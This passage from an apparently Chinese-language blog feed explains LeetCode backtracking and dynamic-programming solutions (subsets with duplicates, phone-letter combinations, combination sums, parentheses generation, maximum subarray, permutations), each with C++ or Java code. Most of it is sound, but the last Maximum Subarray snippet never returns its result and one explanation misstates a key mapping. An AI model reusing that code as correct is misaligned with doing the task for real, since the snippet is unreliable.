<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div></pre></td><td class="code"><pre><div class="line">示例:</div><div class="line"></div><div class="line">输入: [1,2,2]</div><div class="line">输出:</div><div class="line">[</div><div class="line">  [2],</div><div class="line">  [1],</div><div class="line">  [1,2,2],</div><div class="line">  [2,2],</div><div class="line">  [1,2],</div><div class="line">  []</div><div class="line">]</div></pre></td></tr></table></figure>
<p>思路：</p>
<ol>
<li>解法一：</li>
</ol>
<p>举例说明我的算法：</p>
<p>设S={1,2,2}，则size=3</p>
<p>在不考虑重复的情况下，子集共有2^3=8个</p>
<p>分别为：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div></pre></td><td class="code"><pre><div class="line">0,0,0  &#123;&#125;</div><div class="line"></div><div class="line">0,0,1  &#123;2&#125;</div><div class="line"></div><div class="line">0,1,0  &#123;2&#125;</div><div class="line"></div><div class="line">0,1,1  &#123;2,2&#125;</div><div class="line"></div><div class="line">1,0,0  &#123;1&#125;</div><div class="line"></div><div class="line">1,0,1  &#123;1,2&#125;</div><div class="line"></div><div class="line">1,1,0  &#123;1,2&#125;</div><div class="line"></div><div class="line">1,1,1  &#123;1,2,2&#125;</div></pre></td></tr></table></figure></p>
<p>1表示对应位的元素存在于集合中，0表示不存在。</p>
<p>因此只要从0遍历到2^size - 1，如果对应位为1，则将S中相应元素加入当前集合。</p>
<p>对于Note的两点要求：</p>
<p>1、sort函数对集合排序</p>
<p>2、使用map去重，存在即去除</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div></pre></td><td class="code"><pre><div class="line">class Solution &#123;</div><div class="line">public:</div><div class="line">    vector&lt;vector&lt;int&gt;&gt; subsetsWithDup(vector&lt;int&gt;&amp; nums) &#123;</div><div class="line">        vector&lt;vector&lt;int&gt;&gt; res;</div><div class="line">        map&lt;vector&lt;int&gt;,bool&gt; m;</div><div class="line">        int length = nums.size();</div><div class="line">        for(int i=0;i&lt;(1&lt;&lt;length);i++)&#123;</div><div class="line">        	int tag = i;</div><div class="line">        	vector&lt;int&gt; tmp;</div><div class="line">        	for(int j=0;j&lt;length;j++)&#123;</div><div class="line">        		if(i&amp;(1&lt;&lt;j))&#123;</div><div class="line">        			tmp.push_back(nums[j]);</div><div class="line">        		&#125;</div><div class="line">        	&#125;</div><div class="line">        	sort(tmp.begin(),tmp.end());</div><div class="line">        	if(m.find(tmp) == m.end())&#123;</div><div class="line">        		m[tmp] = true;</div><div class="line">        		res.push_back(tmp);</div><div class="line">        	&#125;</div><div class="line">        &#125;</div><div class="line"></div><div class="line">        return res;</div><div class="line">    &#125;</div><div class="line">&#125;;</div></pre></td></tr></table></figure>
<p>解法一额外开辟了map，因此占用了大量的空间。</p>
<p>可以这样来看。</p>
<p>后加入的元素，需要加入全部已有的集合，并且考虑重复。</p>
<p>再次考虑S={1,2,2}，先排序。</p>
<p>首先加入空集{}</p>
<p>对于元素1，需要加入{}，成为新的集合{1}</p>
<p>对于元素2，需要加入{}和{1}，成为新的集合{2}和{1,2}。考虑重复，再产生新集合{2,2}和{1,2,2}。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div></pre></td><td class="code"><pre><div class="line">class Solution &#123;</div><div class="line">public:</div><div class="line">    vector&lt;vector&lt;int&gt;&gt; subsetsWithDup(vector&lt;int&gt;&amp; nums) &#123;</div><div class="line">        vector&lt;vector&lt;int&gt; &gt; ret;</div><div class="line">        vector&lt;int&gt; empty;</div><div class="line">        ret.push_back(empty);</div><div class="line">        </div><div class="line">        sort(nums.begin(), nums.end());</div><div class="line">        unordered_map&lt;int, int&gt; count;</div><div class="line">        for(int i = 0; i &lt; nums.size(); i ++)</div><div class="line">            count[nums[i]] ++;</div><div class="line">        vector&lt;int&gt;::iterator iter = unique(nums.begin(), nums.end());</div><div class="line">        nums.erase(iter, nums.end());</div><div class="line">        for(int i = 0; i &lt; nums.size(); i ++)</div><div class="line">        &#123;</div><div class="line">            int size = ret.size();</div><div class="line">            for(int j = 0; j &lt; size; j ++)</div><div class="line">            &#123;</div><div class="line">                vector&lt;int&gt; newset = ret[j];</div><div class="line">                for(int k = 0; k &lt; count[nums[i]]; k ++)  //产生重复元素的集合 &#123;22&#125;</div><div class="line">                &#123;</div><div class="line">                    newset.push_back(nums[i]);</div><div class="line">                    ret.push_back(newset);</div><div class="line">                &#125;</div><div class="line">            &#125;</div><div class="line">        &#125;</div><div class="line">        return ret;</div><div class="line">    &#125;</div><div class="line">&#125;;</div></pre></td></tr></table></figure>
<h3 id="LeetCode-17-Letter-Combinations-of-a-Phone-Number"><a href="#LeetCode-17-Letter-Combinations-of-a-Phone-Number" class="headerlink" title="LeetCode 17 Letter Combinations of a Phone Number"></a><a href="https://leetcode-cn.com/problems/letter-combinations-of-a-phone-number/description/" target="_blank" rel="external">LeetCode 17 Letter Combinations of a Phone Number</a></h3><p>题目大意：给定一个仅包含数字 2-9 的字符串，返回所有它能表示的字母组合。<br>给出数字到字母的映射如下（与电话按键相同）。注意 1 不对应任何字母。</p>
<p><img src="http://upload.wikimedia.org/wikipedia/commons/thumb/7/73/Telephone-keypad2.svg/200px-Telephone-keypad2.svg.png" alt="题目图片"></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">示例:</div><div class="line"></div><div class="line">输入：&quot;23&quot;</div><div class="line">输出：[&quot;ad&quot;, &quot;ae&quot;, &quot;af&quot;, &quot;bd&quot;, &quot;be&quot;, &quot;bf&quot;, &quot;cd&quot;, &quot;ce&quot;, &quot;cf&quot;].</div></pre></td></tr></table></figure>
<p>思路：经典的backtracking（回溯算法）的题目。当一个题目，存在各种满足条件的组合，并且需要把它们全部列出来时，就可以考虑backtracking了。当然，backtracking在一定程度上属于穷举，所以当数据特别大的时候，不合适。而对于那些题目，可能就需要通过动态规划来完成。</p>
<p>这道题的思路很简单，假设输入的是”23”，2对应的是”abc”，3对应的是”edf”，那么我们在递归时，先确定2对应的其中一个字母（假设是a），然后进入下一层，穷举3对应的所有字母，并组合起来（”ae”，”ad”，”af”），当”edf”穷举完后，返回上一层，更新字母b，再重新进入下一层。这个就是backtracing的基本思想。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div></pre></td><td class="code"><pre><div class="line">public class Solution &#123;</div><div class="line">    public List&lt;String&gt; letterCombinations(String digits) &#123;</div><div class="line">        //把table上的数字对应的字母列出来，当输入为2是，digits[2]就是2所对应的&quot;abc&quot;</div><div class="line">        String[] table = new String[] </div><div class="line">                             &#123;&quot;&quot;,&quot;&quot;,&quot;abc&quot;,&quot;def&quot;,&quot;ghi&quot;,&quot;jkl&quot;,&quot;mno&quot;,&quot;pqrs&quot;,&quot;tuv&quot;,&quot;wxyz&quot;&#125;;</div><div class="line">        List&lt;String&gt; list = new ArrayList&lt;String&gt;();</div><div class="line">        //index从0开始，即digits的第一个数字</div><div class="line">        letterCombinations(list,digits,&quot;&quot;,0,table);</div><div class="line">        return list;</div><div class="line">    &#125;</div><div class="line">    </div><div class="line">    private void letterCombinations (List&lt;String&gt; list, String digits, </div><div class="line">                                    String curr, int index,String[] table) &#123;</div><div class="line">        //最后一层退出条件</div><div class="line">        if (index == digits.length()) &#123;</div><div class="line">            if(curr.length() != 0) list.add(curr);</div><div class="line">            return;</div><div class="line">        &#125;</div><div class="line">        </div><div class="line">        //找到数字对应的字符串</div><div class="line">        String temp = table[digits.charAt(index) - &apos;0&apos;];</div><div class="line">        for (int i = 0; i &lt; temp.length(); i++) &#123;</div><div class="line">            //每次循环把不同字符串加到当前curr之后</div><div class="line">            String next = curr + temp.charAt(i);</div><div class="line">            //进入下一层</div><div class="line">            letterCombinations(list,digits,next,index+1,table);</div><div class="line">        &#125;</div><div class="line">    &#125;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<h3 id="LeetCode-39-Combination-Sum"><a href="#LeetCode-39-Combination-Sum" class="headerlink" title="LeetCode 39 Combination Sum"></a><a href="https://leetcode-cn.com/problems/combination-sum/description/" target="_blank" rel="external">LeetCode 39 Combination Sum</a></h3><p>题目大意:给定一个无重复元素的数组 candidates 和一个目标数 target ，找出 candidates 中所有可以使数字和为 target 的组合。</p>
<p>candidates 中的数字可以无限制重复被选取。</p>
<p>说明：</p>
<ul>
<li>所有数字（包括 target）都是正整数。</li>
<li>解集不能包含重复的组合。 </li>
</ul>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div></pre></td><td class="code"><pre><div class="line">示例 1:</div><div class="line"></div><div class="line">输入: candidates = [2,3,6,7], target = 7,</div><div class="line">所求解集为:</div><div class="line">[</div><div class="line">  [7],</div><div class="line">  [2,2,3]</div><div class="line">]</div><div class="line"></div><div class="line">示例 2:</div><div class="line"></div><div class="line">输入: candidates = [2,3,5], target = 8,</div><div class="line">所求解集为:</div><div class="line">[</div><div class="line">  [2,2,2,2],</div><div class="line">  [2,3,3],</div><div class="line">  [3,5]</div><div class="line">]</div></pre></td></tr></table></figure>
<p>思路：使用回溯法，用vector记录路径，当找到合适的路径是就保存到结果中，同时进行回溯操作。对于输入candidates=[1,2] ，target=3，遍历的方向如图：<br><img src="https://img-blog.csdn.net/20150706205350137" alt="路径"></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div></pre></td><td class="code"><pre><div class="line">class Solution &#123;</div><div class="line">public:</div><div class="line">    vector&lt;vector&lt;int&gt;&gt; combinationSum(vector&lt;int&gt;&amp; candidates, int target) &#123;</div><div class="line">        vector&lt;vector&lt;int&gt;&gt; result;</div><div class="line">        vector&lt;int&gt; path;</div><div class="line">        sort(candidates.begin(),candidates.end());</div><div class="line">        helper(candidates,0,0,target,path,result);</div><div class="line">        return result;</div><div class="line">    &#125;</div><div class="line"></div><div class="line">void helper(vector&lt;int&gt; &amp;nums,int pos,int base,int target,vector&lt;int&gt;&amp; path,vector&lt;vector&lt;int&gt;&gt; &amp; result)</div><div class="line">    &#123;</div><div class="line">        if(base==target)</div><div class="line">        &#123;</div><div class="line">            result.push_back(path);</div><div class="line">            return ;</div><div class="line">        &#125;</div><div class="line">        if(base&gt;target)</div><div class="line">            return ;</div><div class="line">        for(int i=pos;i&lt;nums.size();i++)</div><div class="line">        &#123;</div><div class="line">            path.push_back(nums[i]);</div><div class="line">            helper(nums,i,base+nums[i],target,path,result);</div><div class="line">            path.pop_back();</div><div class="line">        &#125;</div><div class="line">    &#125;</div><div class="line">&#125;;</div></pre></td></tr></table></figure>
<h3 id="LeetCode-40-Combination-Sum-II"><a href="#LeetCode-40-Combination-Sum-II" class="headerlink" title="LeetCode 40 Combination Sum II"></a><a href="https://leetcode-cn.com/problems/combination-sum-ii/description/" target="_blank" rel="external">LeetCode 40 Combination Sum II</a></h3><p>题目大意：给定一个数组 <code>candidates</code> 和一个目标数 <code>target</code>，找出<code>candidates</code>中所有可以使数字和为<code>target</code>的组合。</p>
<p><code>candidates</code>中的每个数字在每个组合中只能使用一次。</p>
<p>说明：</p>
<ul>
<li>所有数字（包括目标数）都是正整数。</li>
<li>解集不能包含重复的组合。 </li>
</ul>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div></pre></td><td class="code"><pre><div class="line">示例 1:</div><div class="line"></div><div class="line">输入: candidates = [10,1,2,7,6,1,5], target = 8,</div><div class="line">所求解集为:</div><div class="line">[</div><div class="line">  [1, 7],</div><div class="line">  [1, 2, 5],</div><div class="line">  [2, 6],</div><div class="line">  [1, 1, 6]</div><div class="line">]</div><div class="line"></div><div class="line">示例 2:</div><div class="line"></div><div class="line">输入: candidates = [2,5,2,1,2], target = 5,</div><div class="line">所求解集为:</div><div class="line">[</div><div class="line">  [1,2,2],</div><div class="line">  [5]</div><div class="line">]</div></pre></td></tr></table></figure>
<p>思路：递归回溯</p>
<p>需要注意的是：</p>
<p>1、在同一层递归树中，如果某元素已经处理并进入下一层递归，那么与该元素相同的值就应该跳过。否则将出现重复。</p>
<p>例如：1,1,2,3</p>
<p>如果第一个1已经处理并进入下一层递归1,2,3</p>
<p>那么第二个1就应该跳过，因为后续所有情况都已经被覆盖掉。</p>
<p>2、相同元素第一个进入下一层递归，而不是任意一个</p>
<p>例如：1,1,2,3</p>
<p>如果第一个1已经处理并进入下一层递归1,2,3，那么两个1是可以同时成为可行解的</p>
<p>而如果选择的是第二个1并进入下一层递归2,3，那么不会出现两个1的解了。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div></pre></td><td class="code"><pre><div class="line">class Solution &#123;</div><div class="line">public:</div><div class="line">    vector&lt;vector&lt;int&gt;&gt; combinationSum2(vector&lt;int&gt;&amp; candidates, int target) &#123;</div><div class="line">        vector&lt;vector&lt;int&gt;&gt; result;</div><div class="line">        vector&lt;int&gt; path;</div><div class="line">        sort(candidates.begin(),candidates.end());    //排序</div><div class="line">        // candidates.erase(unique(candidates.begin(),candidates.end()),candidates.end());</div><div class="line">        helper(candidates,0,0,target,path,result);</div><div class="line">        return result;</div><div class="line">    &#125;</div><div class="line"></div><div class="line">    void helper(vector&lt;int&gt; &amp;nums,int pos,int base,int target,vector&lt;int&gt;&amp; path,vector&lt;vector&lt;int&gt;&gt; &amp; result)</div><div class="line">    &#123;</div><div class="line">        if(base==target)</div><div class="line">        &#123;</div><div class="line">            result.push_back(path);</div><div class="line">            return ;</div><div class="line">        &#125;</div><div class="line">        if(base&gt;target)</div><div class="line">            return ;</div><div class="line">        for(int i=pos;i&lt;nums.size();i++)</div><div class="line">        &#123;   </div><div class="line">        	if(i != pos &amp;&amp; nums[i] == nums[i-1])   //跳过后面相同的元素</div><div class="line">                    continue;</div><div class="line">            path.push_back(nums[i]);</div><div class="line">            helper(nums,i+1,base+nums[i],target,path,result);</div><div class="line">            path.pop_back();</div><div class="line">        &#125;</div><div class="line">    &#125;</div><div class="line">&#125;;</div></pre></td></tr></table></figure>
<h3 id="LeetCode-22-Generate-Parentheses-括号生成"><a href="#LeetCode-22-Generate-Parentheses-括号生成" class="headerlink" title="LeetCode 22 Generate Parentheses 括号生成 "></a><a href="https://leetcode-cn.com/problems/generate-parentheses/description/" target="_blank" rel="external">LeetCode 22 Generate Parentheses 括号生成 </a></h3><p>题目大意:给出 n 代表生成括号的对数，请你写出一个函数，使其能够生成所有可能的并且有效的括号组合。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div></pre></td><td class="code"><pre><div class="line">例如，给出 n = 3，生成结果为：</div><div class="line"></div><div class="line">[</div><div class="line">  &quot;((()))&quot;,</div><div class="line">  &quot;(()())&quot;,</div><div class="line">  &quot;(())()&quot;,</div><div class="line">  &quot;()(())&quot;,</div><div class="line">  &quot;()()()&quot;</div><div class="line">]</div></pre></td></tr></table></figure>
<p>思路：<br>对于这道题，第一个肯定是’(‘，接下来即可以是’(‘也可以是’)’，只需要满足下面三条规则：</p>
<ul>
<li>当left=0&amp;&amp;right=0时表示找到一条路径</li>
<li>当left!=0时可以向左子树伸展</li>
<li>当right!=0&amp;&amp;left&lt; right时可以向右子树伸展</li>
</ul>
<p>[left：表示剩余左括号的数目;right：表示剩余右括号的数目]</p>
<p><img src="images/LeetCode-22-01.png" alt="算法图解"></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div></pre></td><td class="code"><pre><div class="line">class Solution &#123;</div><div class="line">public:</div><div class="line">    vector&lt;string&gt; generateParenthesis(int n) &#123;</div><div class="line">       vector&lt;string&gt; result;</div><div class="line">       string path;</div><div class="line">       helper(n,n,path,result);</div><div class="line">       return result;</div><div class="line">    &#125;</div><div class="line"></div><div class="line">    void helper(int left,int right,string path,vector&lt;string&gt; &amp; result)</div><div class="line">    &#123;</div><div class="line">        if(left==0&amp;&amp;right==0)</div><div class="line">        &#123;</div><div class="line">            result.push_back(path);</div><div class="line">            return ;</div><div class="line">        &#125;</div><div class="line">        if(left!=0)</div><div class="line">            helper(left-1,right,path+&quot;(&quot;,result);</div><div class="line">        if(right!=0&amp;&amp;left&lt;right)</div><div class="line">            helper(left,right-1,path+&quot;)&quot;,result);</div><div class="line">    &#125;</div><div class="line"></div><div class="line">&#125;;</div></pre></td></tr></table></figure>
<h3 id="LeetCode-53-Maximum-Subarray"><a href="#LeetCode-53-Maximum-Subarray" class="headerlink" title="LeetCode 53 Maximum Subarray"></a><a href="https://leetcode-cn.com/problems/maximum-subarray/description/" target="_blank" rel="external">LeetCode 53 Maximum Subarray</a></h3><p>题目大意：给定一个整数数组 nums ，找到一个具有最大和的连续子数组（子数组最少包含一个元素），返回其最大和。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">示例:</div><div class="line"></div><div class="line">输入: [-2,1,-3,4,-1,2,1,-5,4],</div><div class="line">输出: 6</div><div class="line">解释: 连续子数组 [4,-1,2,1] 的和最大，为 6。</div></pre></td></tr></table></figure>
<p>思路：</p>
<ul>
<li>分治法</li>
</ul>
<p>假设求A[l..r]的最大子串和</p>
<p>首先将其分成两半A[l..m]和A[m+1..r]，其中m=(l+r)/2，并分别求递归求出这两半的最大子串和，不妨称为left，right。如下图所示：</p>
<p><img src="/images/LeetCode-53-01.png" alt="分治法"></p>
<p>A[l..r]的连续子串和可能出现在左半边（即left），或者可能出现在右半边（即right），还可能出现在横跨左右两半的地方（即middle），如下图橙色部分所示：</p>
<p><img src="/images/LeetCode-53-02.png" alt="分治法"></p>
<p>当然，middle完全有可能覆盖left或right，它可能的范围入下图所示：</p>
<p><img src="/images/LeetCode-53-03.png" alt="分治法"></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div></pre></td><td class="code"><pre><div class="line">class Solution &#123;</div><div class="line">public:</div><div class="line">    int maxSubArray(vector&lt;int&gt;&amp; nums) &#123;</div><div class="line">        return divide(nums, 0, nums.size()-1);  </div><div class="line">    &#125; </div><div class="line"></div><div class="line">    int divide(vector&lt;int&gt;&amp; nums,int l,int r)&#123;</div><div class="line">        if(l == r) return nums[l];</div><div class="line">        if(l == r-1) return max(nums[l], max(nums[r], nums[l]+nums[r])); </div><div class="line"></div><div class="line">        int mid = (l+r)&gt;&gt;1;</div><div class="line">        int lret = divide(nums, l, mid-1);  </div><div class="line">        int rret = divide(nums, mid+1, r);  </div><div class="line">        int mret = nums[mid];</div><div class="line">        int sum = mret;</div><div class="line">        for(int i = mid-1;i&gt;=l;--i)&#123;</div><div class="line">            sum += nums[i];</div><div class="line">            mret = max(mret,sum);</div><div class="line">        &#125;</div><div class="line">        sum = mret;</div><div class="line">        for(int i = mid+1;i&lt;=r;++i)&#123;</div><div class="line">            sum += nums[i];</div><div class="line">            mret = max(mret,sum);</div><div class="line">        &#125;</div><div class="line"></div><div class="line">        return max(lret, max(rret, mret));  </div><div class="line"></div><div class="line">    &#125;</div><div class="line">&#125;;</div></pre></td></tr></table></figure>
<ul>
<li>动态规划</li>
</ul>
<p><code>dp[i]</code>表示以<code>nums[i]</code>结尾的最大子序列和。</p>
<p>那么有：<code>dp[i]= max { dp[i-1]  +  nums[i] ,  nums[i] }</code></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div></pre></td><td class="code"><pre><div class="line">class Solution &#123;  </div><div class="line">public:  </div><div class="line">    int maxSubArray(vector&lt;int&gt;&amp; nums) &#123;  </div><div class="line">        vector&lt;int&gt;dp(nums.size());  </div><div class="line">        int result = nums[0];  </div><div class="line">        dp[0]=nums[0];  </div><div class="line">        for (int i = 1; i &lt; nums.size(); i++)  </div><div class="line">        &#123;  </div><div class="line">            dp[i] = max(dp[i - 1] + nums[i], nums[i]);  </div><div class="line">            if (result &lt; dp[i])  </div><div class="line">                result = dp[i];  </div><div class="line">        &#125;  </div><div class="line">        return result;  </div><div class="line">    &#125;  </div><div class="line">&#125;;</div></pre></td></tr></table></figure>
<p>可以简单优化一下：因为递推式只用到了后一项，所以在编码实现的时候可以进行状态压缩，用一个变量即可，即不需要开一个数组了。</p>
<p>时间复杂度O(n)，空间复杂度O(1)<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div></pre></td><td class="code"><pre><div class="line">class Solution &#123;  </div><div class="line">public:  </div><div class="line">    int maxSubArray(vector&lt;int&gt;&amp; nums) &#123;    </div><div class="line">        int ans = 0,res = INT_MIN;</div><div class="line">        int len = nums.size();</div><div class="line">        for(int i=0;i&lt;len;i++)&#123;</div><div class="line">            if(ans&lt;0) ans = 0;</div><div class="line">            ans += nums[i];</div><div class="line">            res = max(ans,res);</div><div class="line">        &#125;</div><div class="line">    &#125;    </div><div class="line">&#125;;</div></pre></td></tr></table></figure></p>
<h3 id="Leetcode-46-Permutations-全排列"><a href="#Leetcode-46-Permutations-全排列" class="headerlink" title="Leetcode 46 Permutations 全排列"></a><a href="https://leetcode-cn.com/problems/permutations/description/" target="_blank" rel="external">Leetcode 46 Permutations 全排列</a></h3><p>题目大意：给定一个没有重复数字的序列，返回其所有可能的全排列。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div></pre></td><td class="code"><pre><div class="line">示例:</div><div class="line"></div><div class="line">输入: [1,2,3]</div><div class="line">输出:</div><div class="line">[</div><div class="line">  [1,2,3],</div><div class="line">  [1,3,2],</div><div class="line">  [2,1,3],</div><div class="line">  [2,3,1],</div><div class="line">  [3,1,2],</div><div class="line">  [3,2,1]</div><div class="line">]</div></pre></td></tr></table></figure>
<p>思路：选择用：dfs+回溯（思路是深搜每个元素，选择，直到树的底部，如果满足条件放入结果，返回，回溯）</p>
<p>排列用：递归+交换（思路是对n个元素的数组想象成n层的树，全排列，每个元素都要到第i层去，所以枚举每一层，然后让每个元素都来这一层。每一层是一个递归，在递归里面用for循环让每个元素都来一次本层）</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div></pre></td><td class="code"><pre><div class="line">class Solution &#123;</div><div class="line">public:</div><div class="line">    vector&lt;vector&lt;int&gt;&gt; permute(vector&lt;int&gt;&amp; nums) &#123;</div><div class="line">        vector&lt;vector&lt;int&gt;&gt; result;</div><div class="line">        helper(nums,0,result);</div><div class="line">        return result;</div><div class="line">    &#125;</div><div class="line"></div><div class="line">    void helper(vector&lt;int&gt;&amp; nums,int pos,vector&lt;vector&lt;int&gt;&gt;&amp; result)&#123;</div><div class="line">    	if(pos == nums.size())&#123;</div><div class="line">    		result.push_back(nums);</div><div class="line">            return;</div><div class="line">    	&#125;</div><div class="line"></div><div class="line">    	int length = nums.size();</div><div class="line">    	for(int i=pos;i&lt;length;++i)&#123;</div><div class="line">    		swap(nums,pos,i);</div><div class="line">    		helper(nums,pos+1,result);</div><div class="line">    		swap(nums,i,pos);</div><div class="line">    	&#125;</div><div class="line">    &#125;</div><div class="line"></div><div class="line">    void swap(vector&lt;int&gt;&amp; nums, int i, int j) &#123;</div><div class="line">        int temp = nums[i];</div><div class="line">        nums[i] = nums[j];</div><div class="line">        nums[j]  = temp;</div><div class="line">    &#125;</div><div class="line">&#125;;</div></pre></td></tr></table></figure>
]]></content>
    
    <summary type="html">
    
      &lt;h3 id=&quot;LeetCode-11-Container-With-Most-Water（最大水容器）&quot;&gt;&lt;a href=&quot;#LeetCode-11-Container-With-Most-Water（最大水容器）&quot; class=&quot;headerlink&quot; title=&quot;Leet
    
    </summary>
    
      <category term="LeetCode" scheme="http://yoursite.com/categories/LeetCode/"/>
    
    
      <category term="LeetCode" scheme="http://yoursite.com/tags/LeetCode/"/>
    
  </entry>
  
</feed>
